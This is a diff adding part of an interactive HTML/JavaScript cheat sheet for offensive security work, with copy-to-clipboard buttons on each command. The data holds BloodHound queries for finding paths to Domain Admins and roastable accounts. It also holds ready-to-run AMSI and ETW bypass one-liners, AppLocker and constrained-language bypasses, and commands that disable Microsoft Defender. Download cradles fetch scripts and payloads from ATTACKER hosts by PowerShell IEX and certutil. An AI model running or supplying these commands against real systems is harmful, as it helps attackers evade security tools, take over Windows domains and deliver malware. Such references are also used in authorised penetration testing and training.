+    c('Find DA shortest path','MATCH (m:User),(n:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}) MATCH p=shortestPath((m)-[*1..]->(n)) RETURN p'),
+    c('Kerberoastable admins','MATCH (u:User {hasspn:true})-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}) RETURN u.name'),
+    c('Unconstrained machines','MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name'),
+    c('Users with DCSync','MATCH (u)-[:GetChanges|GetChangesAll|GetChangesInFilteredSet]->(d:Domain) RETURN u.name'),
+    c('AS-REP roastable','MATCH (u:User {dontreqpreauth:true}) RETURN u.name'),
+    c('Users with GenericAll','MATCH (u:User)-[:GenericAll]->(g:Group) WHERE g.name CONTAINS "ADMIN" RETURN u.name,g.name'),
+  ]),
+  h('Custom Edges & Marks',[
+    nt('Mark owned: right-click → Mark as Owned'),
+    nt('Mark high-value: right-click → Mark as High Value'),
+    nt('Custom queries save under Queries tab'),
+    nt('Pre-built analytics: Find Shortest Paths to DA, Kerberoastable Users, etc.'),
+  ]),
+]},
+{id:'powershellbypass',label:'36. AV/EDR & Bypass',color:'#e6ee9c',x:1680,y:3550,parent:null,items:[
+  h('AMSI Bypass',[
+    c('Classic reflection bypass','[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)'),
+    c('Matt Graebers one-liner','[Runtime.InteropServices.Marshal]::WriteByte([Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext",[Reflection.BindingFlags]"NonPublic,Static").GetValue($null),0x80)'),
+    nt('Obfuscate before use — signatures get flagged quickly'),
+  ]),
+  h('PowerShell Constrained Language Mode',[
+    c('Check language mode','$ExecutionContext.SessionState.LanguageMode'),
+    c('Bypass via installutil','C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\temp\\bypass.exe'),
+    c('Bypass via MSBuild','C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\temp\\bypass.csproj'),
+    c('PSByPassCLM','PSByPassCLM.exe'),
+  ]),
+  h('AppLocker Bypass',[
+    c('Check AppLocker policy','Get-AppLockerPolicy -Effective -Xml'),
+    nt('Common bypass dirs: C:\\Windows\\Tasks, C:\\Windows\\Temp'),
+    c('MSBuild bypass','MSBuild.exe payload.csproj'),
+    c('WMIC bypass','wmic process call create "cmd.exe"'),
+  ]),
+  h('Defender Evasion',[
+    c('Disable real-time','Set-MpPreference -DisableRealtimeMonitoring $true'),
+    c('Add exclusion path','Add-MpExclusion -Path "C:\\temp"'),
+    c('Check exclusions','Get-MpPreference | Select ExclusionPath'),
+    c('Obfuscate with Invoke-Obfuscation','Invoke-Obfuscation'),
+    c('Payload with ScareCrow','ScareCrow -I payload.bin -Loader binary -domain microsoft.com'),
+  ]),
+  h('ETW Bypass',[
+    c('Patch ETW','[Reflection.Assembly]::LoadWithPartialName("System.Core").GetType("System.Diagnostics.Eventing.EventProvider").GetField("m_enabled","NonPublic,Instance").SetValue([Ref].Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider").GetField("etwProvider","NonPublic,Static").GetValue($null),0)'),
+  ]),
+  h('Encoding & Obfuscation',[
+    c('Base64 encode PS','$cmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("IEX(New-Object Net.WebClient).DownloadString(\'http://ATTACKER/script.ps1\')"))'),
+    c('Execute encoded','powershell -enc BASE64_STRING'),
+    c('Certutil download','certutil -urlcache -split -f http://ATTACKER_IP/payload.exe C:\\temp\\payload.exe'),
+  ]),
+]}
+
+];
+
+
+let nodeEls={}, nodeMap={};
+DATA.forEach(d=>{nodeMap[d.id]=d});
+
+let scale=0.48, tx=240, ty=20;
+const canvas=document.getElementById('cv');
+const world=document.getElementById('wd');
+const svgEl=document.getElementById('lines');
+
+function updateTransform(){world.style.transform=`translate(${tx}px,${ty}px) scale(${scale})`}
+function resetZoom(){scale=0.48;tx=240;ty=20;updateTransform();requestAnimationFrame(drawLines)}
+function expandAll(){Object.values(nodeEls).forEach(el=>{el.classList.remove('col');el.querySelector('.nh button').textContent='⊖'})}
+function collapseAll(){Object.values(nodeEls).forEach(el=>{el.classList.add('col');el.querySelector('.nh button').textContent='⊕'})}
+updateTransform();
+
+let frontZ=10;
+function bringToFront(el){
+  frontZ++;
+  document.querySelectorAll('.nd.front').forEach(n=>n.classList.remove('front'));
+  el.classList.add('front');
+  el.style.zIndex=frontZ;
+}
+
+function getInput(id){return document.getElementById(id).value.trim()||document.getElementById(id).placeholder}
+function tok(s){
+  if(!s) return s;
+  const ip=getInput('tip-ip'), port=getInput('tip-port'), dom=getInput('tip-dom');
+  return s.replace(/DC_IP/g,ip).replace(/PORT/g,port).replace(/domain\.local/g,dom).replace(/10\.10\.10\.10/g,ip).replace(/\bIP\b/g,ip);
+}
+
+function buildItem(item,depth){
+  const wrap=document.createElement('div');
+  if(item.note){
+    wrap.className='it note';
+    wrap.style.paddingLeft=(18+depth*10)+'px';
+    wrap.textContent='ℹ '+item.label;
+    return wrap;
+  }
+  const hasSub=item.sub&&item.sub.length>0;
+  const hasCmd=!!item.cmd;
+  wrap.className='it'+(hasSub?' has-sub':'');
+  wrap.style.paddingLeft=(18+depth*10)+'px';
+  const lbl=document.createElement('span');
+  lbl.className='lbl';
+  wrap.appendChild(lbl);
+
+  if(hasSub){
+    lbl.textContent=item.label||'';
+    const tog=document.createElement('span');
+    tog.className='tog';
+    tog.textContent='▶';
+    wrap.appendChild(tog);
+    const si=document.createElement('div');
+    si.className='si';
+    item.sub.forEach(sub=>si.appendChild(buildItem(sub,depth+1)));
+    wrap.addEventListener('click',e=>{
+      e.stopPropagation();
+      wrap.classList.toggle('op');
+      tog.textContent=wrap.classList.contains('op')?'▼':'▶';
+      const parentNode=wrap.closest('.nd');
+      if(parentNode) bringToFront(parentNode);
+    });
+    wrap.after(si);
+  } else if(hasCmd){
+    const displayLabel=item.label&&item.label!==item.cmd?item.label:(item.cmd.length>65?item.cmd.substring(0,65)+'…':item.cmd);
+    lbl.textContent=displayLabel;
+    lbl.title=item.cmd;
+    const badge=document.createElement('span');
+    badge.className='badge';
+    badge.textContent='CMD';
+    wrap.appendChild(badge);
+    const cp=document.createElement('button');
+    cp.className='cp';
+    cp.textContent='Copy';
+    cp.title='Copy command to clipboard';
+    cp.addEventListener('click',e=>{
+      e.stopPropagation();
+      navigator.clipboard.writeText(tok(item.cmd)).catch(()=>{});
+      cp.textContent='✓';
+      setTimeout(()=>cp.textContent='Copy',1200);
+    });
+    wrap.appendChild(cp);
+    // cmd-box: shown below the row when clicked
+    const cmdBox=document.createElement('div');
+    cmdBox.className='cmd-box';
+    cmdBox.textContent=tok(item.cmd);
+    wrap.addEventListener('click',e=>{
+      e.stopPropagation();
+      wrap.classList.toggle('show-cmd');
+      // insert/remove box right after wrap
+      if(wrap.classList.contains('show-cmd')){
+        wrap.after(cmdBox);
+      } else {
+        if(cmdBox.parentNode) cmdBox.parentNode.removeChild(cmdBox);
+      }
+      const parentNode=wrap.closest('.nd');
+      if(parentNode) bringToFront(parentNode);
+    });
+  } else {
+    lbl.textContent=item.label||'';
+  }
+  return wrap;
+}
+
+function buildNode(d){
+  const el=document.createElement('div');
+  el.className='nd col';
+  el.style.left=d.x+'px';
+  el.style.top=d.y+'px';
+  el.style.zIndex=1;
+  el.style.borderLeftColor=d.color;
+  const nh=document.createElement('div');
+  nh.className='nh';
+  const sp=document.createElement('span');
+  sp.textContent=d.label;
+  sp.style.color=d.color;
+  nh.appendChild(sp);
+  const btn=document.createElement('button');
+  btn.textContent='⊕';
+  btn.title='Expand/Collapse';
+  btn.addEventListener('click',e=>{
+    e.stopPropagation();
+    el.classList.toggle('col');
+    btn.textContent=el.classList.contains('col')?'⊕':'⊖';
+    bringToFront(el);
+    requestAnimationFrame(drawLines);
+  });
+  nh.appendChild(btn);
+  el.appendChild(nh);
+  const nb=document.createElement('div');
+  nb.className='nb';
+  d.items.forEach(item=>{
+    if(item.items){
+      const sec=document.createElement('div');
+      sec.className='it sub-hd has-sub';
+      const secLbl=document.createElement('span');
+      secLbl.className='lbl';
+      secLbl.textContent=item.label;
+      sec.appendChild(secLbl);
+      const tog=document.createElement('span');
+      tog.className='tog';
+      tog.textContent='▶';
+      sec.appendChild(tog);
+      nb.appendChild(sec);
+      const si=document.createElement('div');
+      si.className='si';
+      item.items.forEach(sub=>si.appendChild(buildItem(sub,0)));
+      nb.appendChild(si);
+      sec.addEventListener('click',e=>{
+        e.stopPropagation();
+        sec.classList.toggle('op');
+        tog.textContent=sec.classList.contains('op')?'▼':'▶';
+        bringToFront(el);
+      });
+    } else {
+      nb.appendChild(buildItem(item,0));
+    }
+  });
+  el.appendChild(nb);
+  // drag header
+  let dragging=false,dx=0,dy=0;
+  nh.addEventListener('mousedown',e=>{
+    if(e.target===btn) return;
+    e.stopPropagation(); e.preventDefault();
+    dragging=true;
+    dx=e.clientX-d.x*scale-tx;
+    dy=e.clientY-d.y*scale-ty;
+    bringToFront(el);
+    const onMv=e=>{
+      if(!dragging) return;
+      d.x=(e.clientX-tx-dx)/scale;
+      d.y=(e.clientY-ty-dy)/scale;
+      el.style.left=d.x+'px';
+      el.style.top=d.y+'px';
+      requestAnimationFrame(drawLines);
+    };
+    const onUp=()=>{dragging=false;document.removeEventListener('mousemove',onMv);document.removeEventListener('mouseup',onUp)};
+    document.addEventListener('mousemove',onMv);
+    document.addEventListener('mouseup',onUp);
+  });
+  el.addEventListener('mousedown',()=>bringToFront(el));
+  nodeEls[d.id]=el;
+  world.appendChild(el);
+}
+
+function elbowPath(x1,y1,x2,y2){
+  const midX=x1+Math.max(40,(x2-x1)/2);
+  return `M ${x1} ${y1} L ${midX} ${y1} L ${midX} ${y2} L ${x2} ${y2}`;
+}
+function drawLines(){
+  svgEl.innerHTML='';
+  svgEl.setAttribute('width',Math.max(world.scrollWidth,8000));
+  svgEl.setAttribute('height',Math.max(world.scrollHeight,5000));
+  const rootEl=document.getElementById('root-node');
+  if(!rootEl) return;
+  const rx=rootEl.offsetLeft+rootEl.offsetWidth;
+  const ry=rootEl.offsetTop+rootEl.offsetHeight/2;
+  Object.keys(nodeEls).forEach(id=>{
+    const d=nodeMap[id];
+    const el=nodeEls[id];
+    const cx=el.offsetLeft;
+    const cy=el.offsetTop+20;
+    const path=document.createElementNS('http://www.w3.org/2000/svg','path');
+    path.setAttribute('d',elbowPath(rx,ry,cx,cy));
+    path.setAttribute('stroke',d.color);
+    path.setAttribute('fill','none');
+    path.setAttribute('stroke-width','1.5');
+    path.setAttribute('opacity','0.55');
+    svgEl.appendChild(path);
+  });
+}
+
+DATA.forEach(d=>buildNode(d));
+
+// Root legend
+const rootList=document.getElementById('root-node');
+DATA.forEach(d=>{
+  const row=document.createElement('div');
+  row.className='rl';
+  row.innerHTML=`<span class="dot" style="background:${d.color}"></span>${d.label}`;
+  row.addEventListener('click',()=>{
+    const el=nodeEls[d.id];
+    bringToFront(el);
+    el.classList.remove('col');
+    el.querySelector('.nh button').textContent='⊖';
+    // pan to center on node
+    const nxPx=d.x*scale+tx;
+    const nyPx=d.y*scale+ty;
+    tx+=canvas.clientWidth/2-nxPx-80;
+    ty+=canvas.clientHeight/2-nyPx-60;
+    updateTransform();
+    requestAnimationFrame(drawLines);
+  });
+  rootList.appendChild(row);
+});
+
+// Search
+document.getElementById('srch').addEventListener('input',e=>{
+  const q=e.target.value.toLowerCase().trim();
+  Object.keys(nodeEls).forEach(id=>{
+    const el=nodeEls[id];
+    const d=nodeMap[id];
+    if(!q){el.classList.remove('dim','hl');return;}
+    const match=d.label.toLowerCase().includes(q)||JSON.stringify(d.items).toLowerCase().includes(q);
+    el.classList.toggle('dim',!match);
+    el.classList.toggle('hl',match);
+    if(match){el.classList.remove('col');el.querySelector('.nh button').textContent='⊖';}
+  });
+});
+
+// Canvas pan (left-click drag on empty canvas)
+let px=0,py=0,panning=false;
+canvas.addEventListener('mousedown',e=>{
+  if(e.target.closest('.nd')||e.target.closest('#root-node')||e.target.closest('button')||e.target.closest('input')) return;
+  panning=true; px=e.clientX; py=e.clientY;
+  canvas.classList.add('panning');
+  e.preventDefault();
+});
+canvas.addEventListener('contextmenu',e=>e.preventDefault());
+document.addEventListener('mousemove',e=>{
+  if(!panning) return;
+  tx+=e.clientX-px; ty+=e.clientY-py;
+  px=e.clientX; py=e.clientY;
+  updateTransform();
+});
+document.addEventListener('mouseup',()=>{panning=false;canvas.classList.remove('panning')});
+
+// Zoom on scroll
+canvas.addEventListener('wheel',e=>{
+  e.preventDefault();
+  const delta=e.deltaY>0?0.92:1.08;
+  const rect=canvas.getBoundingClientRect();
+  const mx=e.clientX-rect.left;
+  const my=e.clientY-rect.top;
+  tx=mx-(mx-tx)*delta;
+  ty=my-(my-ty)*delta;
+  scale=Math.max(0.1,Math.min(3,scale*delta));
+  updateTransform();
+  requestAnimationFrame(drawLines);
+},{passive:false});
+
+setTimeout(drawLines,300);
+window.addEventListener('resize',drawLines);
+
+</script>
+</body>
+</html>
